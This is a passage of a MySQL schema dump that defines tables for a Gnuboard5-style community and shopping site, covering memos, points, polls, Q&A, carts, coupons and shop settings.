  `bl_recv_mb_id` varchar(20) NOT NULL DEFAULT '',
  `bl_send_mb_id` varchar(20) NOT NULL DEFAULT '',
  `bl_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`bl_id`),
  KEY `bl_recv_mb_id` (`bl_recv_mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_member_social_profiles
-- ----------------------------
CREATE TABLE `g5_member_social_profiles` (
  `mp_no` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `provider` varchar(50) NOT NULL DEFAULT '',
  `object_sha` varchar(45) NOT NULL DEFAULT '',
  `identifier` varchar(255) NOT NULL DEFAULT '',
  `profileurl` varchar(255) NOT NULL DEFAULT '',
  `photourl` varchar(255) NOT NULL DEFAULT '',
  `displayname` varchar(150) NOT NULL DEFAULT '',
  `description` varchar(255) NOT NULL DEFAULT '',
  `mp_register_day` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mp_latest_day` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  UNIQUE KEY `mp_no` (`mp_no`),
  KEY `mb_id` (`mb_id`),
  KEY `provider` (`provider`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_memo
-- ----------------------------
CREATE TABLE `g5_memo` (
  `me_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_recv_mb_id` varchar(20) NOT NULL DEFAULT '',
  `me_send_mb_id` varchar(20) NOT NULL DEFAULT '',
  `me_send_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `me_read_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `me_memo` text NOT NULL,
  `me_send_id` int(11) NOT NULL DEFAULT 0,
  `me_type` enum('send','recv') NOT NULL DEFAULT 'recv',
  `me_send_ip` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`me_id`),
  KEY `me_recv_mb_id` (`me_recv_mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_menu
-- ----------------------------
CREATE TABLE `g5_menu` (
  `me_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_code` varchar(255) NOT NULL DEFAULT '',
  `me_name` varchar(255) NOT NULL DEFAULT '',
  `me_link` varchar(255) NOT NULL DEFAULT '',
  `me_target` varchar(255) NOT NULL DEFAULT '',
  `me_order` int(11) NOT NULL DEFAULT 0,
  `me_use` tinyint(4) NOT NULL DEFAULT 0,
  `me_mobile_use` tinyint(4) NOT NULL DEFAULT 0,
  PRIMARY KEY (`me_id`)
) ENGINE=InnoDB AUTO_INCREMENT=387 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_new_win
-- ----------------------------
CREATE TABLE `g5_new_win` (
  `nw_id` int(11) NOT NULL AUTO_INCREMENT,
  `nw_device` varchar(10) NOT NULL DEFAULT 'both',
  `nw_begin_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `nw_end_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `nw_disable_hours` int(11) NOT NULL DEFAULT 0,
  `nw_left` int(11) NOT NULL DEFAULT 0,
  `nw_top` int(11) NOT NULL DEFAULT 0,
  `nw_height` int(11) NOT NULL DEFAULT 0,
  `nw_width` int(11) NOT NULL DEFAULT 0,
  `nw_subject` text NOT NULL,
  `nw_content` text NOT NULL,
  `nw_content_html` tinyint(4) NOT NULL DEFAULT 0,
  PRIMARY KEY (`nw_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_point
-- ----------------------------
CREATE TABLE `g5_point` (
  `po_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `po_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `po_content` varchar(255) NOT NULL DEFAULT '',
  `po_point` int(11) NOT NULL DEFAULT 0,
  `po_use_point` int(11) NOT NULL DEFAULT 0,
  `po_expired` tinyint(4) NOT NULL DEFAULT 0,
  `po_expire_date` date NOT NULL DEFAULT '0000-00-00',
  `po_mb_point` int(11) NOT NULL DEFAULT 0,
  `po_rel_table` varchar(20) NOT NULL DEFAULT '',
  `po_rel_id` varchar(20) NOT NULL DEFAULT '',
  `po_rel_action` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`po_id`),
  KEY `index1` (`mb_id`,`po_rel_table`,`po_rel_id`,`po_rel_action`),
  KEY `index2` (`po_expire_date`)
) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_poll
-- ----------------------------
CREATE TABLE `g5_poll` (
  `po_id` int(11) NOT NULL AUTO_INCREMENT,
  `po_subject` varchar(255) NOT NULL DEFAULT '',
  `po_poll1` varchar(255) NOT NULL DEFAULT '',
  `po_poll2` varchar(255) NOT NULL DEFAULT '',
  `po_poll3` varchar(255) NOT NULL DEFAULT '',
  `po_poll4` varchar(255) NOT NULL DEFAULT '',
  `po_poll5` varchar(255) NOT NULL DEFAULT '',
  `po_poll6` varchar(255) NOT NULL DEFAULT '',
  `po_poll7` varchar(255) NOT NULL DEFAULT '',
  `po_poll8` varchar(255) NOT NULL DEFAULT '',
  `po_poll9` varchar(255) NOT NULL DEFAULT '',
  `po_cnt1` int(11) NOT NULL DEFAULT 0,
  `po_cnt2` int(11) NOT NULL DEFAULT 0,
  `po_cnt3` int(11) NOT NULL DEFAULT 0,
  `po_cnt4` int(11) NOT NULL DEFAULT 0,
  `po_cnt5` int(11) NOT NULL DEFAULT 0,
  `po_cnt6` int(11) NOT NULL DEFAULT 0,
  `po_cnt7` int(11) NOT NULL DEFAULT 0,
  `po_cnt8` int(11) NOT NULL DEFAULT 0,
  `po_cnt9` int(11) NOT NULL DEFAULT 0,
  `po_etc` varchar(255) NOT NULL DEFAULT '',
  `po_level` tinyint(4) NOT NULL DEFAULT 0,
  `po_point` int(11) NOT NULL DEFAULT 0,
  `po_date` date NOT NULL DEFAULT '0000-00-00',
  `po_ips` mediumtext NOT NULL,
  `mb_ids` text NOT NULL,
  PRIMARY KEY (`po_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_poll_etc
-- ----------------------------
CREATE TABLE `g5_poll_etc` (
  `pc_id` int(11) NOT NULL DEFAULT 0,
  `po_id` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `pc_name` varchar(255) NOT NULL DEFAULT '',
  `pc_idea` varchar(255) NOT NULL DEFAULT '',
  `pc_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`pc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_popular
-- ----------------------------
CREATE TABLE `g5_popular` (
  `pp_id` int(11) NOT NULL AUTO_INCREMENT,
  `pp_word` varchar(50) NOT NULL DEFAULT '',
  `pp_date` date NOT NULL DEFAULT '0000-00-00',
  `pp_ip` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`pp_id`),
  UNIQUE KEY `index1` (`pp_date`,`pp_word`,`pp_ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_qa_config
-- ----------------------------
CREATE TABLE `g5_qa_config` (
  `qa_title` varchar(255) NOT NULL DEFAULT '',
  `qa_category` varchar(255) NOT NULL DEFAULT '',
  `qa_skin` varchar(255) NOT NULL DEFAULT '',
  `qa_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `qa_use_email` tinyint(4) NOT NULL DEFAULT 0,
  `qa_req_email` tinyint(4) NOT NULL DEFAULT 0,
  `qa_use_hp` tinyint(4) NOT NULL DEFAULT 0,
  `qa_req_hp` tinyint(4) NOT NULL DEFAULT 0,
  `qa_use_sms` tinyint(4) NOT NULL DEFAULT 0,
  `qa_send_number` varchar(255) NOT NULL DEFAULT '0',
  `qa_admin_hp` varchar(255) NOT NULL DEFAULT '',
  `qa_admin_email` varchar(255) NOT NULL DEFAULT '',
  `qa_use_editor` tinyint(4) NOT NULL DEFAULT 0,
  `qa_subject_len` int(11) NOT NULL DEFAULT 0,
  `qa_mobile_subject_len` int(11) NOT NULL DEFAULT 0,
  `qa_page_rows` int(11) NOT NULL DEFAULT 0,
  `qa_mobile_page_rows` int(11) NOT NULL DEFAULT 0,
  `qa_image_width` int(11) NOT NULL DEFAULT 0,
  `qa_upload_size` int(11) NOT NULL DEFAULT 0,
  `qa_insert_content` text NOT NULL,
  `qa_include_head` varchar(255) NOT NULL DEFAULT '',
  `qa_include_tail` varchar(255) NOT NULL DEFAULT '',
  `qa_content_head` text NOT NULL,
  `qa_content_tail` text NOT NULL,
  `qa_mobile_content_head` text NOT NULL,
  `qa_mobile_content_tail` text NOT NULL,
  `qa_1_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_2_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_3_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_4_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_5_subj` varchar(255) NOT NULL DEFAULT '',
  `qa_1` varchar(255) NOT NULL DEFAULT '',
  `qa_2` varchar(255) NOT NULL DEFAULT '',
  `qa_3` varchar(255) NOT NULL DEFAULT '',
  `qa_4` varchar(255) NOT NULL DEFAULT '',
  `qa_5` varchar(255) NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_qa_content
-- ----------------------------
CREATE TABLE `g5_qa_content` (
  `qa_id` int(11) NOT NULL AUTO_INCREMENT,
  `qa_num` int(11) NOT NULL DEFAULT 0,
  `qa_parent` int(11) NOT NULL DEFAULT 0,
  `qa_related` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `qa_name` varchar(255) NOT NULL DEFAULT '',
  `qa_email` varchar(255) NOT NULL DEFAULT '',
  `qa_hp` varchar(255) NOT NULL DEFAULT '',
  `qa_type` tinyint(4) NOT NULL DEFAULT 0,
  `qa_category` varchar(255) NOT NULL DEFAULT '',
  `qa_email_recv` tinyint(4) NOT NULL DEFAULT 0,
  `qa_sms_recv` tinyint(4) NOT NULL DEFAULT 0,
  `qa_html` tinyint(4) NOT NULL DEFAULT 0,
  `qa_subject` varchar(255) NOT NULL DEFAULT '',
  `qa_content` text NOT NULL,
  `qa_status` tinyint(4) NOT NULL DEFAULT 0,
  `qa_file1` varchar(255) NOT NULL DEFAULT '',
  `qa_source1` varchar(255) NOT NULL DEFAULT '',
  `qa_file2` varchar(255) NOT NULL DEFAULT '',
  `qa_source2` varchar(255) NOT NULL DEFAULT '',
  `qa_ip` varchar(255) NOT NULL DEFAULT '',
  `qa_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `qa_1` varchar(255) NOT NULL DEFAULT '',
  `qa_2` varchar(255) NOT NULL DEFAULT '',
  `qa_3` varchar(255) NOT NULL DEFAULT '',
  `qa_4` varchar(255) NOT NULL DEFAULT '',
  `qa_5` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`qa_id`),
  KEY `qa_num_parent` (`qa_num`,`qa_parent`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_scrap
-- ----------------------------
CREATE TABLE `g5_scrap` (
  `ms_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` varchar(15) NOT NULL DEFAULT '',
  `ms_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`ms_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_banner
-- ----------------------------
CREATE TABLE `g5_shop_banner` (
  `bn_id` int(11) NOT NULL AUTO_INCREMENT,
  `bn_alt` varchar(255) NOT NULL DEFAULT '',
  `bn_url` varchar(255) NOT NULL DEFAULT '',
  `bn_device` varchar(10) NOT NULL DEFAULT '',
  `bn_position` varchar(255) NOT NULL DEFAULT '',
  `bn_border` tinyint(4) NOT NULL DEFAULT 0,
  `bn_new_win` tinyint(4) NOT NULL DEFAULT 0,
  `bn_begin_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `bn_end_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `bn_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `bn_hit` int(11) NOT NULL DEFAULT 0,
  `bn_order` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`bn_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_cart
-- ----------------------------
CREATE TABLE `g5_shop_cart` (
  `ct_id` int(11) NOT NULL AUTO_INCREMENT,
  `od_id` bigint(20) unsigned NOT NULL,
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `it_id` varchar(20) NOT NULL DEFAULT '',
  `it_name` varchar(255) NOT NULL DEFAULT '',
  `it_sc_type` tinyint(4) NOT NULL DEFAULT 0,
  `it_sc_method` tinyint(4) NOT NULL DEFAULT 0,
  `it_sc_price` int(11) NOT NULL DEFAULT 0,
  `it_sc_minimum` int(11) NOT NULL DEFAULT 0,
  `it_sc_qty` int(11) NOT NULL DEFAULT 0,
  `ct_status` varchar(255) NOT NULL DEFAULT '',
  `ct_history` text NOT NULL,
  `ct_price` int(11) NOT NULL DEFAULT 0,
  `ct_point` int(11) NOT NULL DEFAULT 0,
  `cp_price` int(11) NOT NULL DEFAULT 0,
  `ct_point_use` tinyint(4) NOT NULL DEFAULT 0,
  `ct_stock_use` tinyint(4) NOT NULL DEFAULT 0,
  `ct_option` varchar(255) NOT NULL DEFAULT '',
  `ct_qty` int(11) NOT NULL DEFAULT 0,
  `ct_notax` tinyint(4) NOT NULL DEFAULT 0,
  `io_id` varchar(255) NOT NULL DEFAULT '',
  `io_type` tinyint(4) NOT NULL DEFAULT 0,
  `io_price` int(11) NOT NULL DEFAULT 0,
  `ct_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ct_ip` varchar(25) NOT NULL DEFAULT '',
  `ct_send_cost` tinyint(4) NOT NULL DEFAULT 0,
  `ct_direct` tinyint(4) NOT NULL DEFAULT 0,
  `ct_select` tinyint(4) NOT NULL DEFAULT 0,
  `ct_select_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`ct_id`),
  KEY `od_id` (`od_id`),
  KEY `it_id` (`it_id`),
  KEY `ct_status` (`ct_status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_category
-- ----------------------------
CREATE TABLE `g5_shop_category` (
  `ca_id` varchar(10) NOT NULL DEFAULT '0',
  `ca_name` varchar(255) NOT NULL DEFAULT '',
  `ca_order` int(11) NOT NULL DEFAULT 0,
  `ca_skin_dir` varchar(255) NOT NULL DEFAULT '',
  `ca_mobile_skin_dir` varchar(255) NOT NULL DEFAULT '',
  `ca_skin` varchar(255) NOT NULL DEFAULT '',
  `ca_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `ca_img_width` int(11) NOT NULL DEFAULT 0,
  `ca_img_height` int(11) NOT NULL DEFAULT 0,
  `ca_mobile_img_width` int(11) NOT NULL DEFAULT 0,
  `ca_mobile_img_height` int(11) NOT NULL DEFAULT 0,
  `ca_sell_email` varchar(255) NOT NULL DEFAULT '',
  `ca_use` tinyint(4) NOT NULL DEFAULT 0,
  `ca_stock_qty` int(11) NOT NULL DEFAULT 0,
  `ca_explan_html` tinyint(4) NOT NULL DEFAULT 0,
  `ca_head_html` text NOT NULL,
  `ca_tail_html` text NOT NULL,
  `ca_mobile_head_html` text NOT NULL,
  `ca_mobile_tail_html` text NOT NULL,
  `ca_list_mod` int(11) NOT NULL DEFAULT 0,
  `ca_list_row` int(11) NOT NULL DEFAULT 0,
  `ca_mobile_list_mod` int(11) NOT NULL DEFAULT 0,
  `ca_mobile_list_row` int(11) NOT NULL DEFAULT 0,
  `ca_include_head` varchar(255) NOT NULL DEFAULT '',
  `ca_include_tail` varchar(255) NOT NULL DEFAULT '',
  `ca_mb_id` varchar(255) NOT NULL DEFAULT '',
  `ca_cert_use` tinyint(4) NOT NULL DEFAULT 0,
  `ca_adult_use` tinyint(4) NOT NULL DEFAULT 0,
  `ca_nocoupon` tinyint(4) NOT NULL DEFAULT 0,
  `ca_1_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_2_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_3_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_4_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_5_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_6_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_7_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_8_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_9_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_10_subj` varchar(255) NOT NULL DEFAULT '',
  `ca_1` varchar(255) NOT NULL DEFAULT '',
  `ca_2` varchar(255) NOT NULL DEFAULT '',
  `ca_3` varchar(255) NOT NULL DEFAULT '',
  `ca_4` varchar(255) NOT NULL DEFAULT '',
  `ca_5` varchar(255) NOT NULL DEFAULT '',
  `ca_6` varchar(255) NOT NULL DEFAULT '',
  `ca_7` varchar(255) NOT NULL DEFAULT '',
  `ca_8` varchar(255) NOT NULL DEFAULT '',
  `ca_9` varchar(255) NOT NULL DEFAULT '',
  `ca_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`ca_id`),
  KEY `ca_order` (`ca_order`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_coupon
-- ----------------------------
CREATE TABLE `g5_shop_coupon` (
  `cp_no` int(11) NOT NULL AUTO_INCREMENT,
  `cp_id` varchar(100) NOT NULL DEFAULT '',
  `cp_subject` varchar(255) NOT NULL DEFAULT '',
  `cp_method` tinyint(4) NOT NULL DEFAULT 0,
  `cp_target` varchar(255) NOT NULL DEFAULT '',
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `cz_id` int(11) NOT NULL DEFAULT 0,
  `cp_start` date NOT NULL DEFAULT '0000-00-00',
  `cp_end` date NOT NULL DEFAULT '0000-00-00',
  `cp_price` int(11) NOT NULL DEFAULT 0,
  `cp_type` tinyint(4) NOT NULL DEFAULT 0,
  `cp_trunc` int(11) NOT NULL DEFAULT 0,
  `cp_minimum` int(11) NOT NULL DEFAULT 0,
  `cp_maximum` int(11) NOT NULL DEFAULT 0,
  `od_id` bigint(20) unsigned NOT NULL,
  `cp_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`cp_no`),
  UNIQUE KEY `cp_id` (`cp_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_coupon_log
-- ----------------------------
CREATE TABLE `g5_shop_coupon_log` (
  `cl_id` int(11) NOT NULL AUTO_INCREMENT,
  `cp_id` varchar(100) NOT NULL DEFAULT '',
  `mb_id` varchar(100) NOT NULL DEFAULT '',
  `od_id` bigint(20) NOT NULL,
  `cp_price` int(11) NOT NULL DEFAULT 0,
  `cl_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`cl_id`),
  KEY `mb_id` (`mb_id`),
  KEY `od_id` (`od_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_coupon_zone
-- ----------------------------
CREATE TABLE `g5_shop_coupon_zone` (
  `cz_id` int(11) NOT NULL AUTO_INCREMENT,
  `cz_type` tinyint(4) NOT NULL DEFAULT 0,
  `cz_subject` varchar(255) NOT NULL DEFAULT '',
  `cz_start` date NOT NULL DEFAULT '0000-00-00',
  `cz_end` date NOT NULL DEFAULT '0000-00-00',
  `cz_file` varchar(255) NOT NULL DEFAULT '',
  `cz_period` int(11) NOT NULL DEFAULT 0,
  `cz_point` int(11) NOT NULL DEFAULT 0,
  `cp_method` tinyint(4) NOT NULL DEFAULT 0,
  `cp_target` varchar(255) NOT NULL DEFAULT '',
  `cp_price` int(11) NOT NULL DEFAULT 0,
  `cp_type` tinyint(4) NOT NULL DEFAULT 0,
  `cp_trunc` int(11) NOT NULL DEFAULT 0,
  `cp_minimum` int(11) NOT NULL DEFAULT 0,
  `cp_maximum` int(11) NOT NULL DEFAULT 0,
  `cz_download` int(11) NOT NULL DEFAULT 0,
  `cz_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`cz_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_shop_default
-- ----------------------------
CREATE TABLE `g5_shop_default` (
  `de_admin_company_owner` varchar(255) NOT NULL DEFAULT '',
  `de_admin_company_name` varchar(255) NOT NULL DEFAULT '',
  `de_admin_company_saupja_no` varchar(255) NOT NULL DEFAULT '',
  `de_admin_company_tel` varchar(255) NOT NULL DEFAULT '',
  `de_admin_company_fax` varchar(255) NOT NULL DEFAULT '',
  `de_admin_tongsin_no` varchar(255) NOT NULL DEFAULT '',
  `de_admin_company_zip` varchar(255) NOT NULL DEFAULT '',
  `de_admin_company_addr` varchar(255) NOT NULL DEFAULT '',
  `de_admin_info_name` varchar(255) NOT NULL DEFAULT '',
  `de_admin_info_email` varchar(255) NOT NULL DEFAULT '',
  `de_shop_skin` varchar(255) NOT NULL DEFAULT '',
  `de_shop_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `de_type1_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_type1_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_type1_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_type1_list_row` int(11) NOT NULL DEFAULT 0,
  `de_type1_img_width` int(11) NOT NULL DEFAULT 0,
  `de_type1_img_height` int(11) NOT NULL DEFAULT 0,
  `de_type2_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_type2_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_type2_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_type2_list_row` int(11) NOT NULL DEFAULT 0,
  `de_type2_img_width` int(11) NOT NULL DEFAULT 0,
  `de_type2_img_height` int(11) NOT NULL DEFAULT 0,
  `de_type3_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_type3_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_type3_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_type3_list_row` int(11) NOT NULL DEFAULT 0,
  `de_type3_img_width` int(11) NOT NULL DEFAULT 0,
  `de_type3_img_height` int(11) NOT NULL DEFAULT 0,
  `de_type4_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_type4_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_type4_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_type4_list_row` int(11) NOT NULL DEFAULT 0,
  `de_type4_img_width` int(11) NOT NULL DEFAULT 0,
  `de_type4_img_height` int(11) NOT NULL DEFAULT 0,
  `de_type5_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_type5_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_type5_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_type5_list_row` int(11) NOT NULL DEFAULT 0,
  `de_type5_img_width` int(11) NOT NULL DEFAULT 0,
  `de_type5_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type1_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_mobile_type1_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_type1_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type1_list_row` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type1_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type1_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type2_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_mobile_type2_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_type2_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type2_list_row` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type2_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type2_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type3_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_mobile_type3_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_type3_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type3_list_row` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type3_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type3_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type4_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_mobile_type4_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_type4_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type4_list_row` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type4_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type4_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type5_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_mobile_type5_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_type5_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type5_list_row` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type5_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_type5_img_height` int(11) NOT NULL DEFAULT 0,
  `de_rel_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_rel_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_rel_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_rel_img_width` int(11) NOT NULL DEFAULT 0,
  `de_rel_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_rel_list_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_mobile_rel_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_rel_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_rel_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_rel_img_height` int(11) NOT NULL DEFAULT 0,
  `de_search_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_search_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_search_list_row` int(11) NOT NULL DEFAULT 0,
  `de_search_img_width` int(11) NOT NULL DEFAULT 0,
  `de_search_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_search_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_search_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_search_list_row` int(11) NOT NULL DEFAULT 0,
  `de_mobile_search_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_search_img_height` int(11) NOT NULL DEFAULT 0,
  `de_listtype_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_listtype_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_listtype_list_row` int(11) NOT NULL DEFAULT 0,
  `de_listtype_img_width` int(11) NOT NULL DEFAULT 0,
  `de_listtype_img_height` int(11) NOT NULL DEFAULT 0,
  `de_mobile_listtype_list_skin` varchar(255) NOT NULL DEFAULT '',
  `de_mobile_listtype_list_mod` int(11) NOT NULL DEFAULT 0,
  `de_mobile_listtype_list_row` int(11) NOT NULL DEFAULT 0,
  `de_mobile_listtype_img_width` int(11) NOT NULL DEFAULT 0,
  `de_mobile_listtype_img_height` int(11) NOT NULL DEFAULT 0,
  `de_bank_use` int(11) NOT NULL DEFAULT 0,
  `de_bank_account` text NOT NULL,
  `de_card_test` int(11) NOT NULL DEFAULT 0,
  `de_card_use` int(11) NOT NULL DEFAULT 0,
  `de_card_noint_use` tinyint(4) NOT NULL DEFAULT 0,
  `de_card_point` int(11) NOT NULL DEFAULT 0,
  `de_settle_min_point` int(11) NOT NULL DEFAULT 0,
  `de_settle_max_point` int(11) NOT NULL DEFAULT 0,
  `de_settle_point_unit` int(11) NOT NULL DEFAULT 0,
  `de_level_sell` int(11) NOT NULL DEFAULT 0,
  `de_delivery_company` varchar(255) NOT NULL DEFAULT '',
  `de_send_cost_case` varchar(255) NOT NULL DEFAULT '',
  `de_send_cost_limit` varchar(255) NOT NULL DEFAULT '',
  `de_send_cost_list` varchar(255) NOT NULL DEFAULT '',
  `de_hope_date_use` int(11) NOT NULL DEFAULT 0,
  `de_hope_date_after` int(11) NOT NULL DEFAULT 0,
  `de_baesong_content` text NOT NULL,
